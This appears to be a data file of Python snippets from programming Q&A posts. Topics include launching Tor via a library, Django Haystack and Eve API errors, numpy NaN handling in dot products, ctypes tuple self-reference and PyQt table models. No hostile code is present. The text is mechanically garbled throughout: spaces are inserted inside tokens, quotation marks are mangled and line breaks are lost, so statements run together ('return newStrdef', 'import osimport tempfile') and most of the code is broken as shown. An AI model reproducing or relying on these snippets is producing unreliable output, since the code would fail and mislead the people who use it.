'SocksPort ' : str ( SOCKS_PORT ) , # 'ExitNodes ' : ' { ru } ' , } , init_msg_handler = print_bootstrap_lines , ) print ( term.format ( `` \nChecking our endpoint : \n '' , term.Attr.BOLD ) ) print ( term.format ( query ( `` https : //www.atagar.com/echo.php '' ) , term.Color.BLUE ) ) tor_process.kill ( ) # stops tor C : \Python > python program1.py← [ 1mStarting Tor : ← [ 0m← [ 34mFeb 28 21:59:45.000 [ notice ] Bootstrapped 0 % : Starting← [ 0m← [ 34mFeb 28 21:59:45.000 [ notice ] Bootstrapped 5 % : Connecting to directory server← [ 0m← [ 34mFeb 28 21:59:45.000 [ notice ] Bootstrapped 80 % : Connecting to the Tor network← [ 0m← [ 34mFeb 28 21:59:45.000 [ notice ] Bootstrapped 85 % : Finishing handshake with first hop← [ 0m← [ 34mFeb 28 21:59:46.000 [ notice ] Bootstrapped 90 % : Establishing a Tor circuit← [ 0m← [ 34mFeb 28 21:59:47.000 [ notice ] Bootstrapped 100 % : Done← [ 0m← [ 1mChecking our endpoint : ← [ 0m← [ 34mUnable to reach https : //www.atagar.com/echo.php← [ 0m"
dan @ work : ~/project $ pdf2txt.py docs/homericaeast.pdf dan @ work : ~/project $ < trailer > < dict size= '' 4 '' > < key > Info < /key > < value > < ref id= '' 2 '' / > < /value > < key > Root < /key > < value > < ref id= '' 1 '' / > < /value > < key > ID < /key > < value > < list size= '' 2 '' > < string size= '' 16 '' > on & # 10 ; & # 164 ; & # 181 ; F & # 164 ; 5 & # 193 ; & # 62 ; & # 243 ; _ & # 253 ; v & # 172 ; ` < /string > < string size= '' 16 '' > on & # 10 ; & # 164 ; & # 181 ; F & # 164 ; 5 & # 193 ; & # 62 ; & # 243 ; _ & # 253 ; v & # 172 ; ` < /string > < /list > < /value > < key > Size < /key > < value > < number > 27 < /number > < /value > < /dict > < /trailer > < trailer > < dict size= '' 4 '' > < key > Info < /key > < value > < ref id= '' 2 '' / > < /value > < key > Root < /key > < value > < ref id= '' 1 '' / > < /value > < key > ID < /key > < value > < list size= '' 2 '' > < string size= '' 16 '' > on & # 10 ; & # 164 ; & # 181 ; F & # 164 ; 5 & # 193 ; & # 62 ; & # 243 ; _ & # 253 ; v & # 172 ; ` < /string > < string size= '' 16 '' > on & # 10 ; & # 164 ; & # 181 ; F & # 164 ; 5 & # 193 ; & # 62 ; & # 243 ; _ & # 253 ; v & # 172 ; ` < /string > < /list > < /value > < key > Size < /key > < value > < number > 27 < /number > < /value > < /dict > < /trailer >
def callrecursion ( s ) : a=s.index ( ' ( ' ) z=len ( s ) - string [ : :-1 ] .index ( ' ) ' ) -1 newStr=s [ a+1 : z ] # Something is missing here i cant figure it out print ( newStr ) return newStrdef reverseParentheses ( s ) : if ' ( ' in s : return reverseParentheses ( callrecursion ( s ) ) print ( 'wabba labba dub dub ' ) else : return sstring= ' a ( bcdefghijkl ( mno ) p ) q'reverseParentheses ( string )
"AttributeError at /search/'module ' object has no attribute 'get_model ' import datetimefrom haystack import indexesfrom movies.models import Movieclass MovieIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) title = indexes.CharField ( model_attr='title ' ) def get_model ( self ) : return Movie def index_queryset ( self , using=None ) : `` '' '' Used when the entire index for model is updated . '' '' '' return self.get_model ( ) .objects.all ( ) Environment : Request Method : GETRequest URL : http : //127.0.0.1:8000/search/ ? q=The+Revenant & models=movies.movieDjango Version : 1.9.1Python Version : 2.7.6Installed Applications : ( 'django.contrib.admin ' , 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'whoosh ' , 'haystack ' , 'registration ' , 'crispy_forms ' , 'movies ' , 'mptt ' ) Installed Middleware : ( 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.contrib.auth.middleware.SessionAuthenticationMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.clickjacking.XFrameOptionsMiddleware ' , 'django.middleware.security.SecurityMiddleware ' ) Traceback : File `` /home/dr_sherlock/movienalyse/virmovienalyse/local/lib/python2.7/site-packages/django/core/handlers/base.py '' in get_response 149. response = self.process_exception_by_middleware ( e , request ) File `` /home/dr_sherlock/movienalyse/virmovienalyse/local/lib/python2.7/site-packages/django/core/handlers/base.py '' in get_response 147. response = wrapped_callback ( request , *callback_args , **callback_kwargs ) File `` /home/dr_sherlock/movienalyse/virmovienalyse/local/lib/python2.7/site-packages/haystack/views.py '' in __call__ 51. self.results = self.get_results ( ) File `` /home/dr_sherlock/movienalyse/virmovienalyse/local/lib/python2.7/site-packages/haystack/views.py '' in get_results 91. return self.form.search ( ) File `` /home/dr_sherlock/movienalyse/virmovienalyse/local/lib/python2.7/site-packages/haystack/forms.py '' in search 116. return sqs.models ( *self.get_models ( ) ) File `` /home/dr_sherlock/movienalyse/virmovienalyse/local/lib/python2.7/site-packages/haystack/forms.py '' in get_models 110 . search_models.append ( models.get_model ( *model.split ( ' . ' ) ) ) Exception Type : AttributeError at /search/Exception Value : 'module ' object has no attribute 'get_model '"
"users = { … ‘ friends ’ : { 'type ' : 'list ’ , 'schema ' : { 'type ' : 'objectid ’ , 'data_relation ' : { 'resource ' : 'users ’ } } } } , GET /users/5522987f893e3902048c55ff { `` _updated '' : `` Wed , 15 Apr 2015 17:22:07 GMT '' , '' _created '' : `` Mon , 06 Apr 2015 14:30:23 GMT '' , '' _id '' : `` 5522987f893e3902048c55ff '' , '' friends '' : [ `` 552e9eb0893e391063045edc '' ] } PATCH /users/5522987f893e3902048c55ff { `` friends '' : [ “ 550f288d893e390204b0a5ac ” ] } RESPONSE : { `` _updated '' : `` Wed , 15 Apr 2015 19:38:06 GMT '' , '' _created '' : `` Mon , 06 Apr 2015 14:30:23 GMT '' , '' _status '' : `` OK '' , '' _id '' : `` 5522987f893e3902048c55ff '' } GET /users/5522987f893e3902048c55ff { `` _updated '' : `` Wed , 15 Apr 2015 19:38:06 GMT '' , '' _created '' : `` Mon , 06 Apr 2015 14:30:23 GMT '' , '' _id '' : `` 5522987f893e3902048c55ff '' , '' friends '' : [ `` 550f288d893e390204b0a5ac '' ] } POST /users/5522987f893e3902048c55ff/friends { `` 552e9eb0893e391063045edc '' } RESPONSE : { `` _status '' : `` ERR '' , '' _error '' : { `` message '' : `` The requested URL was not found on the server . If you entered the URL manually please check your spelling and try again . `` , `` code '' : 404 } } POST /users/5522987f893e3902048c55ff { `` friends '' : [ `` 552e9eb0893e391063045edc '' ] } RESPONSE : { `` _status '' : `` ERR '' , '' _error '' : { `` message '' : `` The method is not allowed for the requested URL . `` , `` code '' : 405 } }"
"Traceback ( most recent call last ) : File `` /usr/lib/python2.6/atexit.py '' , line 24 , in _run_exitfuncs func ( *targs , **kargs ) File `` /usr/lib/python2.6/logging/__init__.py '' , line 1508 , in shutdown h.flush ( ) File `` /usr/lib/python2.6/logging/__init__.py '' , line 754 , in flush self.stream.flush ( ) ValueError : I/O operation on closed file"
"import osimport tempfilewith tempfile.TemporaryDirectory ( ) as tmp_dir : print ( 'tmp dir name ' , tmp_dir ) # write file to tmp dir fout = open ( tmp_dir + 'file.txt ' , ' w ' ) fout.write ( 'test write ' ) fout.close ( ) print ( 'file.txt location ' , tmp_dir + 'lala.fasta ' ) # working with the file is fine fin = open ( tmp_dir + 'file.txt ' , ' U ' ) for line in fin : print ( line ) # but I can not find the file in the tmp dir like I normally use os.listdir ( ) for file in os.listdir ( tmp_dir ) : print ( 'searching in directory ' ) print ( file )"
"Point = namedtuple ( 'Point ' , ' x y ' ) p1 = Point ( 20 , 15 ) print ( p1 , p1.__dict__ ) # Point ( x=20 , y=15 ) OrderedDict ( [ ( ' x ' , 20 ) , ( ' y ' , 15 ) ] ) < -- - okclass SubPoint ( Point ) : passp2 = SubPoint ( 20 , 15 ) print ( p2 , p2.__dict__ ) # SubPoint ( x=20 , y=15 ) { } < -- - why is it empty ?"
"x = ..y = ..p = np.matrix ( [ [ x ] , [ y ] ] ) points = interpolate360 ( d , p )"
"ls -l *.csv > > > import subprocess as sp > > > sp.Popen ( [ `` ls '' , `` -l '' , `` *.csv '' ] , stdout = sp.PIPE ) < subprocess.Popen object at 0xb780e90c > > > > ls : can not access *.csv : No such file or directory"
# > > > conda initialize > > > # ! ! Contents within this block are managed by 'conda init ' ! ! eval `` $ ( '/C/Users/User/Anaconda3/Scripts/conda.exe ' 'shell.bash ' 'hook ' ) '' # < < < conda initialize < < <
"class Character : def __init__ ( self , Id , Hp , Mana ) : self.Id = Id ; self.Hp = Hp ; self.Mana = Mana ; def Score ( self ) : return ( self.Hp + self.Mana ) *10 ; MyChar = Character ( 10 , 100 , 100 ) ; print ( MyChar.Score )"
"def send ( self , queue , fd ) : for line in fd : data = line.strip ( ) if data : queue.write ( json.loads ( data ) ) non_blank_lines = ( line.strip ( ) for line in fd if line.strip ( ) ) for line in ifilter ( lambda l : l , imap ( lambda l : l.strip ( ) , fd ) ) : queue.write ( json.loads ( line ) )"
"a = numpy.minimum ( a , b )"
"- url : /lang/strings.js script : js_lang.py Expires : Fri , 01 Apr 2011 09:54:56 GMTCache-Control : public , max-age=600 import datetimethirty_days_in_seconds = 4320000expires_date = datetime.datetime.now ( ) + datetime.timedelta ( days=30 ) HTTP_HEADER_FORMAT = `` % a , % d % b % Y % H : % M:00 GMT '' self.response.headers [ `` Expires '' ] = expires_date.strftime ( HTTP_HEADER_FORMAT ) self.response.headers [ `` Cache-Control '' ] = `` public , max-age= % s '' % thirty_days_in_seconds"
"[ [ 6 . 2 . 3 . 4 . 7 . 5 . 5 . 7 . 8 . 4 . ] [ 1 . 4 . 5 . 5 . 4 . 4 . 8 . 5 . 7 . 5 . ] [ 7 . 3 . 8 . 8 . 3 . 8 . 7 . 3 . 6 . 7 . ] [ 3 . 6 . 7 . 1 . 5 . 6 . 2 . 1 . 5 . 1 . ] [ 8 . 1 . 4 . 3 . 8 . 2 . 3 . 4 . 3 . 3 . ] [ 5 . 8 . 1 . 7 . 1 . 3 . 6 . 8 . 1 . 6 . ] [ 4 . 5 . 2 . 6 . 2 . 1 . 1 . 6 . 4 . 2 . ] [ 2 . 7 . 6 . 2 . 6 . 7 . 4 . 2 . 2 . 8 . ] ] import numpy.randomimport numpydef rand_M ( N ) : M = numpy.zeros ( shape = ( 8 , N ) ) for i in range ( 0 , N ) : M [ : , i ] = numpy.random.choice ( 8 , size = 8 , replace = False ) + 1 return M from timeit import Timer t = Timer ( lambda : rand_M ( 1000 ) ) print ( t.timeit ( 5 ) ) 0.3863314103162543"
"class Program ( models.Model ) : group = models.ForeignKey ( Group , related_name= '' % ( app_label ) s_ % ( class ) s_related '' ) class Program ( models.Model ) : group = models.ForeignKey ( 'auth.Group ' , related_name= '' % ( app_label ) s_ % ( class ) s_related '' ) class ProgramDetailView ( DetailView ) : `` '' '' Detail view of the EEP Program '' '' '' def get_queryset ( self ) : `` '' '' Narrow this based on your company '' '' '' from apps.company.models import Company company = Company.objects.get ( name= '' foo '' ) return Program.objects.filter ( company = company ) from apps.company.models import Companyclass ProgramDetailView ( DetailView ) : `` '' '' Detail view of the EEP Program '' '' '' def get_queryset ( self ) : `` '' '' Narrow this based on your company '' '' '' company = Company.objects.get ( name= '' foo '' ) return Program.objects.filter ( company = company )"
"urlpatterns = patterns ( 'producer.views ' , url ( r'^requisition $ ' , 'requisition ' , name='requisition ' ) , ) import jsonfrom django.http import HttpResponsedef requisition ( request ) : `` do something `` response = HttpResponse ( ) response [ 'Content-type ' ] = 'application/json ' response.write ( json.dumps ( ... ) ) return response ... from django.http import HttpResponseForbidden def requisition ( request ) : `` do something `` if not verify_request_origin ( ) : return HttpResponseForbidden ( `` Denied . '' ) response = HttpResponse ( ) ..."
"class Interval ( Base ) : __tablename__ = 'interval ' id = Column ( Integer , primary_key=True ) start = Column ( Integer , nullable=False ) end = Column ( Integer , nullable=False ) def __init__ ( self , start , end ) : self.start = start self.end = end @ hybrid_property def length ( self ) : return self.end - self.start @ hybrid_method def contains ( self , point ) : return ( self.start < = point ) & ( point < self.end ) @ hybrid_method def intersects ( self , other ) : return self.contains ( other.start ) | self.contains ( other.end ) > > > i1 = Interval ( 5 , 10 ) > > > i1.length5 > > > print Session ( ) .query ( Interval ) .filter ( Interval.length > 10 ) SELECT interval.id AS interval_id , interval.start AS interval_start , interval . `` end '' AS interval_endFROM intervalWHERE interval . `` end '' - interval.start > : param_1 class Person ( models.Model ) : first_name = models.CharField ( max_length=50 ) last_name = models.CharField ( max_length=50 ) def _get_full_name ( self ) : `` Returns the person 's full name . '' return ' % s % s ' % ( self.first_name , self.last_name ) full_name = property ( _get_full_name ) Person.objects.filter ( full_name= '' John Cadengo '' )"
"from numpy import *0*nan , nan*0= > ( nan , nan ) # makes sense # 1a = array ( [ [ 0 ] ] ) b = array ( [ [ nan ] ] ) dot ( a , b ) = > array ( [ [ nan ] ] ) # OK # 2 -- adding a value to b. the first value in the result is # not expected to be affected.a = array ( [ [ 0 ] ] ) b = array ( [ [ nan , 1 ] ] ) dot ( a , b ) = > array ( [ [ 0. , 0 . ] ] ) # EXPECTED : array ( [ [ nan , 0 . ] ] ) # ( also happens in 1.6.2 and 1.8.0 ) # Also , as @ Bill noted , a*b works as expected , but not dot ( a , b ) # 3 -- changing a from 0 to 1 , the first value in the result is # not expected to be affected.a = array ( [ [ 1 ] ] ) b = array ( [ [ nan , 1 ] ] ) dot ( a , b ) = > array ( [ [ nan , 1 . ] ] ) # OK # 4 -- changing shape of a , changes nan in resulta = array ( [ [ 0 ] , [ 0 ] ] ) b = array ( [ [ nan , 1 . ] ] ) dot ( a , b ) = > array ( [ [ 0. , 0 . ] , [ 0. , 0 . ] ] ) # EXPECTED : array ( [ [ nan , 0 . ] , [ nan , 0 . ] ] ) # ( works as expected in 1.6.2 and 1.8.0 ) 1.6.1 linux 64bit/usr/lib/python2.7/dist-packages/numpy/distutils/system_info.py:1423 : UserWarning : Atlas ( http : //math-atlas.sourceforge.net/ ) libraries not found . Directories to search for the libraries can be specified in the numpy/distutils/site.cfg file ( section [ atlas ] ) or by setting the ATLAS environment variable . warnings.warn ( AtlasNotFoundError.__doc__ ) { 'libraries ' : [ 'blas ' ] , 'library_dirs ' : [ '/usr/lib ' ] , 'language ' : 'f77 ' , 'define_macros ' : [ ( 'NO_ATLAS_INFO ' , 1 ) ] } 1.8.0 windows 32bit ( anaconda ) c : \Anaconda\Lib\site-packages\numpy\distutils\system_info.py:1534 : UserWarning : Blas ( http : //www.netlib.org/blas/ ) sources not found . Directories to search for the sources can be specified in the numpy/distutils/site.cfg file ( section [ blas_src ] ) or by setting the BLAS_SRC environment variable . warnings.warn ( BlasSrcNotFoundError.__doc__ ) { }"
"def last_digit ( lst ) : if lst == [ ] : return 1 total = lst [ len ( lst ) -2 ] ** lst [ len ( lst ) -1 ] for n in reversed ( range ( len ( lst ) -2 ) ) : total = pow ( lst [ n ] , total ) return total % 10"
"import numpyimport itertoolsdata = numpy.random.rand ( 4 , 5 , 6 ) # axis=-1 , place ` 200001 ` and ` [ slice ( None ) ] ` on any other position to process along other axesout = numpy.zeros ( ( 4 , 5 , 200001 ) , dtype= '' int64 '' ) indices = [ numpy.arange ( 4 ) , numpy.arange ( 5 ) , [ slice ( None ) ] ] # Iterate over all axes , calculate histogram for each cellfor idx in itertools.product ( *indices ) : out [ idx ] = numpy.histogram ( data [ idx ] , bins=2 * 100000 + 1 , range= ( -100000 - 0.5 , 100000 + 0.5 ) , ) [ 0 ] out.shape # ( 4 , 5 , 200001 )"
"def pd_read_printed ( str_printed_df ) : global pd , StringIO try : x = pd except : import pandas as pd try : x = StringIO except : from pandas.compat import StringIO return pd.read_csv ( StringIO ( str_printed_df ) , delim_whitespace=True ) df1_as_string = `` '' '' Sp Mt Value count4 MM2 S4 bg 105 MM2 S4 dgd 16 MM4 S2 rd 27 MM4 S2 cb 88 MM4 S2 uyi 8 `` '' '' df1 = pandas.someToMeUnknownPandasFunction ( df1_as_string ) df1 = pd_read_printed ( df1_as_string ) print ( df1 ) Sp Mt Value count4 MM2 S4 bg 105 MM2 S4 dgd 16 MM4 S2 rd 27 MM4 S2 cb 88 MM4 S2 uyi 8"
"import numpy as npfrom sklearn import mixture , cross_validationnp.random.seed ( 0 ) n_samples = 300C = np.array ( [ [ 0. , -0.7 ] , [ 3.5 , .7 ] ] ) X = np.r_ [ np.dot ( np.random.randn ( n_samples , 2 ) , C ) , np.random.randn ( n_samples , 2 ) + np.array ( [ 20 , 20 ] ) ] clf = mixture.GMM ( n_components=2 , covariance_type='full ' ) score = cross_validation.cross_val_score ( clf , X ) ValueError : scoring must return a number , got ( < type 'numpy.ndarray ' > ) instead"
"import numpy as npimport matplotlib.pyplot as pltimport seaborn as snssns.set ( style = 'darkgrid ' , font_scale=2 ) t = np.arange ( 100 ) y = np.random.rand ( len ( t ) ) plt.plot ( t , y ) plt.title ( 'Test title ' ) plt.xlabel ( 'Test xlab ' ) plt.ylabel ( 'Tex $ y_i = w_i x_i $ ' ) plt.tight_layout ( ) # plt.show ( ) plt.savefig ( 'test_plot.eps ' , format='eps ' )"
"> > > class A ( object ) : def __str__ ( self ) : print 'Casting A to str ' return u'String ' def __unicode__ ( self ) : print 'Casting A to unicode ' return 'Unicode ' > > > a = A ( ) > > > str ( a ) Casting A to str'String ' > > > unicode ( a ) Casting A to unicodeu'Unicode ' > > > class B ( object ) : def __str__ ( self ) : print 'Casting B to str ' return A ( ) def __unicode__ ( self ) : print 'Casting B to unicode ' return A ( ) > > > b = B ( ) > > > str ( b ) Casting B to strTraceback ( most recent call last ) : File `` < pyshell # 47 > '' , line 1 , in < module > str ( b ) TypeError : __str__ returned non-string ( type A ) > > > unicode ( b ) Casting B to unicodeTraceback ( most recent call last ) : File `` < pyshell # 48 > '' , line 1 , in < module > unicode ( b ) TypeError : coercing to Unicode : need string or buffer , A found"
"[ mpenning @ Hotcoffee ~ ] $ python -c `` import os ; while ( True ) : os.system ( 'ls ' ) '' File `` < string > '' , line 1 import os ; while ( True ) : os.system ( 'ls ' ) ^SyntaxError : invalid syntax [ mpenning @ Hotcoffee ~ ] $ [ mpenning @ Hotcoffee ~ ] $ python -VPython 2.6.6 [ mpenning @ Hotcoffee ~ ] $ uname -aLinux Hotcoffee 2.6.32-5-amd64 # 1 SMP Sun May 6 04:00:17 UTC 2012 x86_64 GNU/Linux [ mpenning @ Hotcoffee ~ ] $ C : \Users\mike_pennington > python -c `` import os ; while True : os.system ( 'dir ' ) '' File `` < string > '' , line 1 import os ; while True : os.system ( 'dir ' ) ^SyntaxError : invalid syntaxC : \Users\mike_pennington > python -VPython 2.7.2C : \Users\mike_pennington >"
"input = [ 1 , 2 , 3 , 4 , 8 , 10 , 11 , 12 , 17 ] output = [ [ 1 , 2 , 3 , 4 ] , [ 8 ] , [ 10 , 11 , 12 ] , [ 17 ] , ]"
"% module test % { static char* MyExceptionName = `` _test.MyException '' ; static PyObject* MyException = NULL ; % } % inline % { static PyObject* Foo ( ) { PyErr_SetNone ( MyException ) ; return NULL ; } % } % init { MyException = PyErr_NewException ( MyExceptionName , NULL , NULL ) ; } from distutils.core import setup , Extensionsetup ( name= '' test '' , version= '' 1.0 '' , ext_modules = [ Extension ( `` _test '' , [ `` test_wrap.c '' ] ) ] ) swig -python -threads test.i python_d -c `` import test ; test.Foo ( ) '' Fatal Python error : PyThreadState_Get : no current thread python27_d.dll ! Py_FatalError ( const char * msg=0x000000001e355a00 ) Line 1677 Cpython27_d.dll ! PyThreadState_Get ( ) Line 330 Cpython27_d.dll ! PyErr_Restore ( _object * type=0x00000000020d50b8 , _object * value=0x0000000000000000 , _object * traceback=0x0000000000000000 ) Line 27 + 0x5 bytes Cpython27_d.dll ! PyErr_SetObject ( _object * exception=0x00000000020d50b8 , _object * value=0x0000000000000000 ) Line 58 Cpython27_d.dll ! PyErr_SetNone ( _object * exception=0x00000000020d50b8 ) Line 64 C_test_d.pyd ! Foo ( ) Line 2976 C"
"class Placerating ( models.Model ) : theplace = models.ForeignKey ( 'ThePlace ' , on_delete=models.CASCADE , null=True , related_name='placeratings ' ) pic = models.OneToOneField ( 'fileupload.Picture ' , on_delete=models.SET_NULL , null=True ) def __unicode__ ( self ) : return self.theplace.nameclass Picture ( models.Model ) : def set_upload_to_info ( self , path , name ) : self.upload_to_info = ( path , name ) file = ImageField ( max_length=500 , upload_to=user_directory_path ) def filename ( self ) : return os.path.basename ( self.file.name ) theplace = models.ForeignKey ( ThePlace , null=True , blank=True , related_name='pictures ' ) def __unicode__ ( self ) : return str ( self.id ) def save ( self , *args , **kwargs ) : super ( Picture , self ) .save ( *args , **kwargs )"
def main ( ) : some_other_module.do_work ( ) if __name__ == '__main__ ' : main ( )
"df [ [ 'age_sent ' , 'last_seen ' , 'forum_reply ' , 'forum_cnt ' , 'forum_exp ' , 'forum_quest ' ] ] .max ( ) age_sent 1516.564016last_seen 986.790035forum_reply 137.000000forum_cnt 155.000000forum_exp 13.000000forum_quest 10.000000 df [ [ 'age_sent ' , 'last_seen ' , 'forum_reply ' , 'forum_cnt ' , 'forum_exp ' , 'forum_quest ' ] ] .plot.hist ( figsize= ( 20 , 10 ) , logy=True , sharex=False , subplots=True ) ttt = pd.DataFrame ( { ' a ' : pd.Series ( np.random.uniform ( 1 , 1000 , 100 ) ) , ' b ' : pd.Series ( np.random.uniform ( 1 , 10 , 100 ) ) } ) ttt.plot.hist ( logy=True , sharex=False , subplots=True ) ttt [ ' a ' ] .plot.hist ( logy=True ) ttt [ ' b ' ] .plot.hist ( logy=True )"
"def f ( a : int ) - > List [ Tuple ( int , float ) ] def g ( a : List [ int ] ) - > List [ decltype ( f ) ] def g ( a : List [ int ] ) - > f.__annotations__ [ 'return ' ] def return_type ( f : Callable ) : try : return get_type_hints ( f ) [ 'return ' ] except ( KeyError , AttributeError ) : return Anydef g ( ) - > return_type ( f ) :"
"import ctypesdef self_reference ( array , index ) : if not isinstance ( array , tuple ) : raise TypeError ( 'array must be a tuple ' ) if not isinstance ( index , int ) : raise TypeError ( 'index must be an int ' ) if not 0 < = index < len ( array ) : raise ValueError ( 'index is out of range ' ) address = id ( array ) obj_refcnt = ctypes.cast ( address , ctypes.POINTER ( ctypes.c_ssize_t ) ) obj_refcnt.contents.value += 1 if ctypes.cdll.python32.PyTuple_SetItem ( ctypes.py_object ( array ) , ctypes.c_ssize_t ( index ) , ctypes.py_object ( array ) ) : raise RuntimeError ( 'PyTuple_SetItem signaled an error ' ) > > > import string > > > a = tuple ( string.ascii_lowercase ) > > > self_reference ( a , 2 ) Traceback ( most recent call last ) : File `` < pyshell # 56 > '' , line 1 , in < module > self_reference ( a , 2 ) File `` C : /Users/schappell/Downloads/srt.py '' , line 15 , in self_reference ctypes.py_object ( array ) ) : WindowsError : exception : access violation reading 0x0000003C > > > Python 3.2.3 ( default , Apr 11 2012 , 07:15:24 ) [ MSC v.1500 32 bit ( Intel ) ] on win32Type `` copyright '' , `` credits '' or `` license ( ) '' for more information. > > > from ctypes import * > > > array = tuple ( range ( 10 ) ) > > > cast ( id ( array ) , POINTER ( c_ssize_t ) ) .contents.value1 > > > cast ( id ( array ) , POINTER ( c_ssize_t ) ) .contents.value += 1 > > > cast ( id ( array ) , POINTER ( c_ssize_t ) ) .contents.value2 > > > array ( 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ) > > > cdll.python32.PyTuple_SetItem ( c_void_p ( id ( array ) ) , 0 , c_void_p ( id ( array ) ) ) Traceback ( most recent call last ) : File `` < pyshell # 6 > '' , line 1 , in < module > cdll.python32.PyTuple_SetItem ( c_void_p ( id ( array ) ) , 0 , c_void_p ( id ( array ) ) ) WindowsError : exception : access violation reading 0x0000003C > > > cdll.python32.PyTuple_SetItem ( c_void_p ( id ( array ) ) , 0 , c_void_p ( id ( array ) ) ) Traceback ( most recent call last ) : File `` < pyshell # 7 > '' , line 1 , in < module > cdll.python32.PyTuple_SetItem ( c_void_p ( id ( array ) ) , 0 , c_void_p ( id ( array ) ) ) WindowsError : exception : access violation reading 0x0000003C > > > array ( 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ) > > > cdll.python32.PyTuple_SetItem ( c_void_p ( id ( array ) ) , 0 , c_void_p ( id ( array ) ) ) 0 > > > array ( ( < NULL > , < code object __init__ at 0x02E68C50 , file `` C : \Python32\libkinter\simpledialog.py '' , line 121 > , < code object destroy at 0x02E68CF0 , file `` C : \Python32\lib kinter\simpledialog.py '' , line 171 > , < code objectbody at 0x02E68D90 , file `` C : \Python32\lib kinter\simpledialog.py '' , line 179 > , < code object buttonbox at 0x02E68E30 , file `` C : \Python32\libkinter\simpledialog.py '' , line 188 > , < code object ok at 0x02E68ED0 , file '' C : \Python32\lib kinter\simpledialog.py '' , line 209 > , < code objectcancel at 0x02E68F70 , file `` C : \Python32\lib kinter\simpledialog.py '' , line 223 > , < code object validate at 0x02E6F070 , file `` C : \Python32\libkinter\simpledialog.py '' , line 233 > , < code object apply at 0x02E6F110 , file '' C : \Python32\lib kinter\simpledialog.py '' , line 242 > , None ) , 1 , 2 , 3 , 4,5 , 6 , 7 , 8 , 9 ) > > > Python 3.2.3 ( default , Apr 11 2012 , 07:15:24 ) [ MSC v.1500 32 bit ( Intel ) ] on win32Type `` copyright '' , `` credits '' or `` license ( ) '' for more information. > > > from ctypes import * > > > array = tuple ( range ( 10 ) ) > > > cdll.python32.PyTuple_SetItem ( c_void_p ( id ( array ) ) , c_ssize_t ( 1 ) , c_void_p ( id ( array ) ) ) 0 > > > array ( 0 , ( ... ) , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ) > > > array [ 1 ] is arrayTrue > > >"
"from datetime import datetimefrom pytz import timezonedatetime ( 2013 , 12 , 27 , 20 , 0 , 0 , tzinfo=timezone ( 'Europe/Bucharest ' ) ) \ .astimezone ( timezone ( 'Europe/Berlin ' ) ) .replace ( tzinfo=None ) datetime.datetime ( 2013 , 12 , 27 , 19 , 16 )"
"def not_logged_in ( view , redirect_url=None ) : def _wrapper ( request , *args , **kwargs ) : if request.user.is_authenticated ( ) : return HttpResponseRedirect ( redirect_url or '/ ' ) return view ( *args , **kwargs ) return _wrapper @ not_logged_indef register ( request ) : ..."
"f [ frozenset ( ( 1,3,4 ) ) ] = 5f [ frozenset ( ( 1 , ) ) ] = 3 F ( 1,3,4 ) = 5F ( 1 ) = 3"
"def DoWebRequest ( ) : thread , error_queue = CreateThread ( ErrorRaisingFunc ) thread.start ( ) thread.join ( ) if not error_queue.empty ( ) : # Purposefully not calling error_queue.get ( ) for illustrative purposes print 'error ! 'def CreateThread ( func ) : error_queue = Queue.Queue ( ) def Handled ( ) : try : func ( ) except Exception : error_queue.put ( sys.exc_info ( ) ) thread = threading.Thread ( target=Handled ) return thread , error_queue long_lived_cache = { } def Alpha ( key ) : expensive_object = long_lived_cache.get ( key ) if not expensive_object : expensive_object = ComputeExpensiveObject ( ) long_lived_cache [ key ] = expensive_object exc_info = AlphaSub ( expensive_object ) if exc_info : print 'error ! ' , exc_infodef AlphaSub ( expensive_object ) : try : ErrorRaisingFunc ( expensive_object ) return None except Exception : return sys.exc_info ( )"
"def flags ( self , index ) : return Qt.ItemIsEnabled | Qt.ItemIsSelectable | Qt.ItemIsEditable from PyQt4.QtCore import *from PyQt4.QtGui import *import sys , osclass Model ( QAbstractTableModel ) : def __init__ ( self , parent=None , *args ) : QAbstractTableModel.__init__ ( self , parent , *args ) self.items = [ [ 'Row0_Column0 ' , 'Row0_Column1 ' , 'Row0_Column2 ' ] , [ 'Row1_Column0 ' , 'Row1_Column1 ' , 'Row1_Column2 ' ] , [ 'Row2_Column0 ' , 'Row2_Column1 ' , 'Row2_Column2 ' ] ] def flags ( self , index ) : return Qt.ItemIsEnabled | Qt.ItemIsSelectable | Qt.ItemIsEditable def rowCount ( self , parent ) : return len ( self.items ) def columnCount ( self , parent ) : return 3 def data ( self , index , role ) : if not index.isValid ( ) : return QVariant ( ) row=index.row ( ) column=index.column ( ) if row > len ( self.items ) : return QVariant ( ) if column > len ( self.items [ row ] ) : return QVariant ( ) if role == Qt.EditRole or role == Qt.DisplayRole : return QVariant ( self.items [ row ] [ column ] ) return QVariant ( ) def setData ( self , index , value , role=Qt.EditRole ) : if index.isValid ( ) : if role == Qt.EditRole : row = index.row ( ) column=index.column ( ) if row > len ( self.items ) or column > len ( self.items [ row ] ) : return False else : self.items [ row ] [ column ] =value return True return Falseclass MyWindow ( QWidget ) : def __init__ ( self , *args ) : QWidget.__init__ ( self , *args ) tablemodel=Model ( self ) tableview=QTableView ( self ) tableview.setModel ( tablemodel ) layout=QVBoxLayout ( self ) layout.addWidget ( tableview ) self.setLayout ( layout ) if __name__ == `` __main__ '' : app = QApplication ( sys.argv ) w = MyWindow ( ) w.show ( ) sys.exit ( app.exec_ ( ) )"
